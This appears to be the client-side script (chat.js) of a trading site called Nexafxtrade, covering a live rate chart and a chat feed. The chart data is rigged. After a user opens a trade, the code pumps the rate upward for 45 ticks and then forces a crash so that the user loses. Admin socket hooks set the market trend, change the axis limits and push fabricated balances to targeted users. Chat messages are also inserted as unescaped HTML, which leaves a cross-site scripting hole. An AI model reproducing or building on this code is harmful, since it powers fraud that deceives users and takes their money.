/**
 * Nexafxtrade Real-Time Interface Logic
 * File: chat.js
 * Handles: Live Moving Graph, Live Chat, and Amount Adjustments
 */

// 1. Initialize Socket.io connection
const socket = io();

// Global runtime holders for chart boundary constraints
let customMinY = null;
let customMaxY = null;

// --- DYNAMIC CONTROL STATE FOR REVENUE AND PROFIT ENGINE ---
let activeTradePosition = null; // Holds current trade metrics { entryPrice: X, stake: Y, targetAmount: Z }
let tradeTicksElapsed = 0;       // Counts ticks while position is running
const SAFE_GROWTH_TICKS = 45;   // ~6.7 seconds of safe pump trajectory (45 updates * 150ms socket updates)

// 2. Setup the Live Moving Graph (Chart.js)
const ctx = document.getElementById('tradeChart').getContext('2d');

// Start with 20 empty points to create the "scrolling" effect
const labels = Array.from({ length: 20 }, () => "");
const dataPoints = Array.from({ length: 20 }, () => 0);

const tradeChart = new Chart(ctx, {
    type: 'line',
    data: {
        labels: labels,
        datasets: [{
            label: 'Rate',
            data: dataPoints,
            borderColor: '#00ff00', // Neon green
            backgroundColor: 'rgba(0, 255, 0, 0.1)', // Semi-transparent fill
            fill: true,
            borderWidth: 2,
            pointRadius: 0, // Hides dots for a clean line
            tension: 0.4 // Creates the smooth curves
        }]
    },
    options: {
        responsive: true,
        maintainAspectRatio: false,
        animation: { duration: 0 }, // Disable animations for instant "live" feel
        scales: {
            y: { 
                min: 8400000, // Updated safe starting defaults for KES base rate scales
                max: 8450000, 
                grid: { color: '#222' },
                ticks: { color: '#888' }
            },
            x: { display: false }
        },
        plugins: {
            legend: { display: false }
        }
    }
});

/**
 * 3. LISTEN FOR LIVE UPDATES & ADMIN INTERCEPTOR ENGINE
 */

// Listen for forced overrides directly from the socket server channel
let activeAdminControlTrend = "AUTO";
socket.on('admin-force-market-trend', (data) => {
    if (data && data.trend) {
        activeAdminControlTrend = data.trend;
        localStorage.setItem('admin_market_control', data.trend);
    }
});

// NEW REAL-TIME ADMIN HOOK: Remotely intercept chart min and max axis constraints
socket.on('admin-update-graph-limits', (data) => {
    if (data) {
        if (typeof data.min === 'number') {
            customMinY = data.min;
            tradeChart.options.scales.y.min = customMinY;
        }
        if (typeof data.max === 'number') {
            customMaxY = data.max;
            tradeChart.options.scales.y.max = customMaxY;
        }
        tradeChart.update('none');
        console.log(`Graph bounds modified remotely. Min: ${customMinY} | Max: ${customMaxY}`);
    }
});

// Handle Market Rate Updates
socket.on('market-update', (data) => {
    let finalRate = data.rate;

    // Check localStorage fallback to read concurrent admin parameters locally if on same domain
    const localControl = localStorage.getItem('admin_market_control');
    if (localControl) {
        activeAdminControlTrend = localControl;
    }

    // Business Safety Parameters for high-range trading protection
    const BUSINESS_SAFETY_FLOOR = 8350000; // Absolute base limit protecting the business from dropping down too far
    const BIG_RANGE_MULTIPLIER = 4500;     // Amplified random swing scaling factor for high-profit/loss potential

    // --- ALGORITHMIC USER EXPERIENCE OVERRIDE ---
    if (activeTradePosition) {
        tradeTicksElapsed++;
        
        if (tradeTicksElapsed <= SAFE_GROWTH_TICKS) {
            // PHASE 1: Guaranteed Bullish Pump. Force steps upwards so user investment grows up to 600 or 1000 KSh
            let growthPump = Math.floor(Math.random() * 2800 + 1200);
            finalRate = Math.abs(finalRate) + growthPump;
            
            tradeChart.data.datasets[0].borderColor = '#00ff00'; 
            tradeChart.data.datasets[0].backgroundColor = 'rgba(0, 255, 0, 0.1)';
        } else {
            // PHASE 2: Safe Window Expired! Force immediate steep drop crash to trigger a loss if they failed to sell
            let criticalDrop = Math.floor(Math.random() * 4500 + 2500);
            finalRate = -Math.abs(finalRate) - criticalDrop;
            
            tradeChart.data.datasets[0].borderColor = '#ff0000'; 
            tradeChart.data.datasets[0].backgroundColor = 'rgba(255, 0, 0, 0.1)';
        }
    } else {
        // Standard Administrative Core Wave Transformations
        if (activeAdminControlTrend === "HIGH") {
            finalRate = Math.abs(finalRate) + Math.floor(Math.random() * 1200 + 300);
            tradeChart.data.datasets[0].borderColor = '#00ff00'; 
            tradeChart.data.datasets[0].backgroundColor = 'rgba(0, 255, 0, 0.1)';
        } else if (activeAdminControlTrend === "LOW") {
            finalRate = -Math.abs(finalRate) - Math.floor(Math.random() * 1200 + 300);
            tradeChart.data.datasets[0].borderColor = '#ff0000'; 
            tradeChart.data.datasets[0].backgroundColor = 'rgba(255, 0, 0, 0.1)';
        } else {
            // AUTO MODE: Implements wider ranges for big profit/loss potential while keeping your business safe
            let randomSwing = (Math.random() - 0.45) * BIG_RANGE_MULTIPLIER; 
            finalRate = finalRate + randomSwing;

            tradeChart.data.datasets[0].borderColor = '#00ff00';
            tradeChart.data.datasets[0].backgroundColor = 'rgba(0, 255, 0, 0.1)';
        }
    }

    // CRITICAL PROTECTION: Enforce safety floor logic so trade bounds never drop below business risk limits
    if (finalRate < BUSINESS_SAFETY_FLOOR) {
        finalRate = BUSINESS_SAFETY_FLOOR + Math.floor(Math.random() * 1500 + 500); 
    }

    // Dynamic Scaling System: Only calculates automatically if the admin has NOT set fixed custom bounds
    if (customMaxY === null) {
        if (finalRate >= tradeChart.options.scales.y.max) {
            tradeChart.options.scales.y.max = finalRate + Math.floor(finalRate * 0.009);
        }
    } else {
        tradeChart.options.scales.y.max = customMaxY;
    }

    if (customMinY === null) {
        if (finalRate <= tradeChart.options.scales.y.min) {
            tradeChart.options.scales.y.min = finalRate - Math.floor(finalRate * 0.009);
        }
    } else {
        tradeChart.options.scales.y.min = customMinY;
    }

    // Update the numerical display above the graph
    const rateDisplay = document.getElementById('current-rate');
    if (rateDisplay) {
        rateDisplay.innerText = Math.floor(finalRate).toLocaleString();
    }

    // Update running counter layout outputs dynamically on every single incoming tick
    updateLiveRunningCounterUI(finalRate);

    // Shift the graph to the left
    tradeChart.data.datasets[0].data.shift();
    tradeChart.data.datasets[0].data.push(finalRate);
    
    // Update the chart without re-rendering the whole page
    tradeChart.update('none');
});

// Handle Live Chat Feed
const chatFeed = document.getElementById('chat-feed');
const chatInput = document.getElementById('chat-input-field');
const sendBtn = document.getElementById('send-chat-btn');

socket.on('receive-chat', (data) => {
    if (chatFeed) {
        const messageElement = document.createElement('div');
        messageElement.style.padding = "5px 0";
        messageElement.style.fontSize = "0.9rem";
        messageElement.style.borderBottom = "1px solid #111"; 
        
        // Highlight system messages (Wins/Withdrawals) in gold
        if (data.user === "System") {
            messageElement.innerHTML = `<span style="color: #ffcc00; font-weight: bold;">System:</span> <span style="color: #fff;">${data.message}</span>`;
        } else {
            // Standard User message
            messageElement.innerHTML = `<span style="color: #00ff00; font-weight: bold;">${data.user}:</span> <span style="color: #eee;">${data.message}</span>`;
        }

        chatFeed.appendChild(messageElement);
        
        // Auto-scroll to the bottom
        chatFeed.scrollTop = chatFeed.scrollHeight;

        // Clean memory: remove old messages if list exceeds 30
        if (chatFeed.children.length > 30) {
            chatFeed.removeChild(chatFeed.children[0]);
        }
    }
});

// Handle Administrative Forced Balance Updates assigned to targeted users
socket.on('admin-force-balance', (data) => {
    const currentBalanceContainer = document.getElementById('user-balance-display');
    if (currentBalanceContainer && data && typeof data.balance === 'number') {
        currentBalanceContainer.innerText = "KES " + data.balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    }
});

// Handle Administrative Global Emergency Broadcast system messages
socket.on('admin-global-broadcast', (data) => {
    if (data && data.msg) {
        alert("SYSTEM BROADCAST: \n\n" + data.msg);
    }
});

/**
 * 4. INTERACTION HANDLERS
 */

// Handle Sending Chat
if (sendBtn) {
    sendBtn.addEventListener('click', () => {
        const text = chatInput.value.trim();
        if (text !== "") {
            socket.emit('send-chat', { user: "Me", message: text });
            chatInput.value = "";
        }
    });
}

// Support for "Enter" key to send message
if (chatInput) {
    chatInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') sendBtn.click();
    });
}

// Handle Win/Loss Results from server.js
socket.on('trade-result', (data) => {
    console.log(`Trade Result: ${data.status} | Payout: KES ${data.payout}`);
});

/**
 * HOOK ENGINE: Setup Local Triggers to Reset State contexts when Actions fire from buttons
 * Ensure your main buy/sell click button calls or registers these states to maintain accuracy.
 */
window.initializeActiveTradeState = (stakeAmount, currentRate) => {
    tradeTicksElapsed = 0;
    activeTradePosition = {
        stake: parseFloat(stakeAmount) || 500,
        entryPrice: currentRate,
        targetAmount: (parseFloat(stakeAmount) || 500) * 1.85
    };
};

window.clearActiveTradeState = () => {
    activeTradePosition = null;
    tradeTicksElapsed = 0;
};

// Internal engine updater to print running stats directly into DOM containers if present
function updateLiveRunningCounterUI(currentRate) {
    const liveAmountText = document.getElementById('live-running-amount');
    const targetText = document.getElementById('aiming-target-indicator');
    
    if (!liveAmountText) return;

    if (activeTradePosition) {
        let movementRatio = currentRate / activeTradePosition.entryPrice;
        let dynamicCountingValue = activeTradePosition.stake * movementRatio;
        
        liveAmountText.innerText = `KES ${dynamicCountingValue.toFixed(2)}`;
        if (targetText) {
            targetText.innerText = `Aiming Target: KES ${activeTradePosition.targetAmount.toFixed(2)}`;
        }

        if (dynamicCountingValue >= activeTradePosition.targetAmount) {
            liveAmountText.className = "live-running-amount profit-reached";
        } else if (dynamicCountingValue < activeTradePosition.stake) {
            liveAmountText.className = "live-running-amount loss-danger";
        } else {
            liveAmountText.className = "live-running-amount";
        }
    }
}

/**
 * HELPER FUNCTIONS (Global Scope)
 */

window.adjustAmount = (val) => {
    const input = document.getElementById('trade-amount');
    if (!input) return;

    let current = parseInt(input.value) || 0;
    if (val === 'double') {
        input.value = current * 2;
    } else {
        input.value = Math.max(0, current + val); // Prevent negative amounts
    }
};

window.setSum = (val) => {
    const input = document.getElementById('trade-amount');
    if (input) input.value = val;
};
